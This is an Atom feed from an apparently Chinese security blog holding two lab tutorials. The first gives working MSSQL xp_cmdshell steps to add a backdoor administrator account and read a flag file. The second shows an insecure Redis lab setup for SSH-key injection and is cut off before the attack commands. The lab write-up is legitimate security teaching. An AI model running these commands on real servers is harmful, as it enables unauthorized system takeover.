<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://kiyomijin.github.io</id>
    <title>My Violet Eva Garden • Posts by &#34;数据库安全&#34; tag</title>
    <link href="https://kiyomijin.github.io" />
    <updated>2022-09-27T14:46:06.000Z</updated>
    <category term="原创" />
    <category term="数据库安全" />
    <category term="CTF小训" />
    <category term="Misc" />
    <entry>
        <id>https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</id>
        <title>MSSQL提权攻击</title>
        <link rel="alternate" href="https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/"/>
        <content type="html">&lt;h1 id=&#34;sql-servermssql提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-servermssql提权&#34;&gt;#&lt;/a&gt; SQL Server（MSSQL）提权&lt;/h1&gt;
&lt;p&gt;总结一下，下文使用有效命令全部为：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#master..xp_cmdshell的全写是master.dbo.xp_cmdshell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net user HeyJack HeyJack /add&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net localgroup administrators HeyJack /add&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;ipconfig&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;type C:\Documents and Settings\桌面\flag.txt&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x01-环境准备&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-环境准备&#34;&gt;#&lt;/a&gt; 0x01 环境准备&lt;/h2&gt;
&lt;p&gt;输入用户名和密码，以 &lt;code&gt;sa&lt;/code&gt;  身份登录 SQL Server2005&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927205858375.png&#34; alt=&#34;image-20220927205858375&#34;&gt;&lt;/p&gt;
&lt;p&gt;登录后可以看到这样的界面&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927210049933.png&#34; alt=&#34;image-20220927210049933&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先我们了解下什么是 sp_configure？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927210431221.png&#34; alt=&#34;image-20220927210431221&#34;&gt;&lt;/p&gt;
&lt;p&gt;其中，在列出高级配置选项的例子中，官网显示了如何设置和列出所有配置选项：首先就是要设置 &lt;code&gt;show advanced options&lt;/code&gt;  为 &lt;code&gt;1&lt;/code&gt; ，可以显示高级选项。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;USE master;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GO  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;sp_configure 的作用是显示或更改当前服务器的全局配置的高级选项，执行成功返回 0，失败返回 1，其中高级选项中包含 cmdshell 等。&lt;/p&gt;
&lt;h2 id=&#34;0x02-提权攻击步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-提权攻击步骤&#34;&gt;#&lt;/a&gt; 0x02 提权攻击步骤&lt;/h2&gt;
&lt;h3 id=&#34;1第一步更改当前服务器的全局配置首选高级选项为1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1第一步更改当前服务器的全局配置首选高级选项为1&#34;&gt;#&lt;/a&gt; ①第一步，更改当前服务器的全局配置首选高级选项为 1&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#以下大写字母均可小写&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;RECONFIGURE;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211220768.png&#34; alt=&#34;image-20220927211220768&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用鼠标选中一行，然后右键选择执行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211614093.png&#34; alt=&#34;image-20220927211614093&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2第二步打开cmd-shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2第二步打开cmd-shell&#34;&gt;#&lt;/a&gt; ②第二步，打开 cmd-shell&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211736845.png&#34; alt=&#34;image-20220927211736845&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;3第三步输入你想执行的windows-cmd命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3第三步输入你想执行的windows-cmd命令&#34;&gt;#&lt;/a&gt; ③第三步，输入你想执行的 windows cmd 命令。&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211958154.png&#34; alt=&#34;image-20220927211958154&#34;&gt;&lt;/p&gt;
&lt;p&gt;言归正传，我们为系统添加属于 &lt;code&gt;攻击者自己的net user账户&lt;/code&gt;  (主要目的是使用已知的用户名和密码)&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#比如，账户名是HeyJack 密码也是HeyJack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net user HeyJack HeyJack /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927212339481.png&#34; alt=&#34;image-20220927212339481&#34;&gt;&lt;/p&gt;
&lt;p&gt;此时，我们在 windows 的 cmd 里，执行 net user&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;这一步是在服务器里面查看。当然，现在只是为了展示我们的创建结果。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net user&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927212609276.png&#34; alt=&#34;image-20220927212609276&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;quot;开始&amp;quot; 菜单 — 管理工具 — 计算机管理 — 本地用户和组 — 用户 —HeyJack 右键属性 — 隶属于&lt;/p&gt;
&lt;p&gt;查看当前分组在 Users 组&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927212746484.png&#34; alt=&#34;image-20220927212746484&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;4第四步将你新建的用户移到administrators组&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4第四步将你新建的用户移到administrators组&#34;&gt;#&lt;/a&gt; ④第四步，将你新建的用户移到 administrators 组&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net localgroup administrators HeyJack /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213122417.png&#34; alt=&#34;image-20220927213122417&#34;&gt;&lt;/p&gt;
&lt;p&gt;继续查看我们的分组情况，可以看到，提权成功：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213219218.png&#34; alt=&#34;image-20220927213219218&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;5第五步获取远程服务器中的目标文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5第五步获取远程服务器中的目标文件&#34;&gt;#&lt;/a&gt; ⑤第五步，获取远程服务器中的目标文件&lt;/h3&gt;
&lt;p&gt;我们假设，服务器中管理员 Administrator 创建了一个 flag.txt 文件放在了桌面，我们的 &lt;code&gt;最终目的&lt;/code&gt; 就是&lt;strong&gt;为了获取它&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221944235.png&#34; alt=&#34;image-20220927221944235&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;第一种方案3389远程连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第一种方案3389远程连接&#34;&gt;#&lt;/a&gt; 第一种方案，3389 远程连接&lt;/h4&gt;
&lt;p&gt;在 win+R 输入 &lt;code&gt;mstsc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213803912.png&#34; alt=&#34;image-20220927213803912&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看服务器 ip 并在自己的客户端上连接，ip 地址也可以通过 SQL 提权命令 + “ipconfig” 来获取&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221540178.png&#34; alt=&#34;image-20220927221540178&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后 3389 远程连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213905588.png&#34; alt=&#34;image-20220927213905588&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入刚刚新建的用户民和密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927214036680.png&#34; alt=&#34;image-20220927214036680&#34;&gt;&lt;/p&gt;
&lt;p&gt;登录成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927214149105.png&#34; alt=&#34;image-20220927214149105&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后打开 “我的电脑”— 进入 C 盘 — 找到 “Documents and Settings”— 选择 “Administrators”— 桌面 — 即可看到 flag.txt&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221815971.png&#34; alt=&#34;image-20220927221815971&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;第二种方案使用sql提权命令获取内容&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第二种方案使用sql提权命令获取内容&#34;&gt;#&lt;/a&gt; 第二种方案，使用 SQL 提权命令获取内容&lt;/h4&gt;
&lt;p&gt;另外，也可以使用 SQL 提权命令去当前管理员用户桌面查找（一般 flag 会放在桌面上）&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#dir命令查看当前路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;dir&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#type命令查看文件内容，一般低版本中，windows桌面的路径为：C:\Documents &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; Settings\桌面\flag.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;type C:\Documents and Settings\Administrator\桌面\flag.txt&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221113281.png&#34; alt=&#34;image-20220927221113281&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，SQL Server 提权攻击演示完毕。&lt;/p&gt;
</content>
        <category term="数据库安全" />
        <updated>2022-09-27T14:46:06.000Z</updated>
    </entry>
    <entry>
        <id>https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</id>
        <title>Redis提权攻击</title>
        <link rel="alternate" href="https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/"/>
        <content type="html">&lt;p&gt;&lt;strong&gt;Redis&lt;/strong&gt;（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI &lt;a href=&#34;https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80&#34;&gt;C 语言&lt;/a&gt;编写、支持网络、可基于内存亦可持久化的日志型、Key-Value&lt;a href=&#34;https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728&#34;&gt; 数据库&lt;/a&gt;，并提供多种语言的 API。从 2010 年 3 月 15 日起，Redis 的开发工作由 VMware 主持。从 2013 年 5 月开始，Redis 的开发由&lt;a href=&#34;https://baike.baidu.com/item/Pivotal&#34;&gt; Pivotal&lt;/a&gt; 赞助。&lt;/p&gt;
&lt;h2 id=&#34;0x00-redis提权攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x00-redis提权攻击&#34;&gt;#&lt;/a&gt; 0x00 Redis 提权攻击&lt;/h2&gt;
&lt;p&gt;​	&lt;strong&gt;Redis&lt;/strong&gt; 在默认情况下，会绑定在 0.0.0.0:&lt;strong&gt;6379&lt;/strong&gt; 上，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务 &lt;code&gt;暴露到公网&lt;/code&gt; 上。&lt;/p&gt;
&lt;p&gt;​	如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。&lt;/p&gt;
&lt;p&gt;​	攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 &lt;code&gt;/root/.ssh&lt;/code&gt;  文件夹的 &lt;code&gt;authotrized_keys&lt;/code&gt;  文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器、添加计划任务、写入 Webshell 等操作。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;类型&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;目标靶机&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Ubuntu18.04&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;192.168.138.143&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;攻击主机&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Kali2022&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;192.168.138.145&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;如果没有攻击机没有安装 ssh 则：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install openssh-server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;启动ssh服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo service ssh start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x01-被攻击机部分准备工作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-被攻击机部分准备工作&#34;&gt;#&lt;/a&gt; 0x01 被攻击机部分准备工作&lt;/h2&gt;
&lt;p&gt;在 Ubuntu 安装 redis 服务器&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get install redis-server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926212305161.png&#34; alt=&#34;image-20220926212305161&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改 /etc/redis/redis.conf，总共有三点：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo vim /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926212807655.png&#34; alt=&#34;image-20220926212807655&#34;&gt;&lt;/p&gt;
&lt;p&gt;①去除 bind&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926213107025.png&#34; alt=&#34;image-20220926213107025&#34;&gt;&lt;/p&gt;
&lt;p&gt;②daemonize yes&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926213521318.png&#34; alt=&#34;image-20220926213521318&#34;&gt;&lt;/p&gt;
&lt;p&gt;③protected-mode no&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232253189.png&#34; alt=&#34;image-20220926232253189&#34;&gt;&lt;/p&gt;
&lt;p&gt;重启服务&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;service redis stop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;以root身份启动redis服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo redis-server /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;尝试在服务器上自己连一下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis-cli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(显示127.0.0.1:6379则OK)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232522408.png&#34; alt=&#34;image-20220926232522408&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x02-攻击机部分准备工作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-攻击机部分准备工作&#34;&gt;#&lt;/a&gt; 0x02 攻击机部分准备工作&lt;/h2&gt;
&lt;p&gt;在攻击机上生成 rsa 秘钥&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214148985.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;重定向到 key.txt&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /home/kali/.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(echo -e &amp;quot;\n\n&amp;quot;; cat id_rsa.pub; echo -e &amp;quot;\n\n&amp;quot;) &amp;gt; key.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214549834.png&#34; alt=&#34;image-20220926214549834&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二句话的含义？其实就是在 id_rsa.pub 的前后加了一个回车&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926214811675.png&#34; alt=&#34;image-20220926214811675&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后，我们在攻击机（也就是我的 kali）上安装 redis-cli&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://download.redis.io/redis-stable.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -zxf redis-stable.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;进入到 redis-stable 目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd redis-stable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;拷贝&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译完成之后，再将 src 目录下的 redis-cli 拷贝到 /usr/bin/ 目录下一份，这样就可直接使用 redis-cli 了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo cp ./src/redis-cli /usr/bin/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220032721.png&#34; alt=&#34;image-20220926220032721&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现如下字样就说明安装成功：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;redis-cli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;回车&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220238790.png&#34; alt=&#34;image-20220926220238790&#34;&gt;&lt;/p&gt;
&lt;p&gt;将我们生成的 key.txt 放到远程主机 (也就是开了 redis 服务的服务器) 的 redis-cli 内存上，查看远程服务器的 ip 为：192.168.138.143&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926220116946.png&#34; alt=&#34;image-20220926220116946&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x03-开始攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-开始攻击&#34;&gt;#&lt;/a&gt; 0x03 开始攻击&lt;/h2&gt;
&lt;p&gt;拿到 redis 的 shell 后基本操作：&lt;/p&gt;
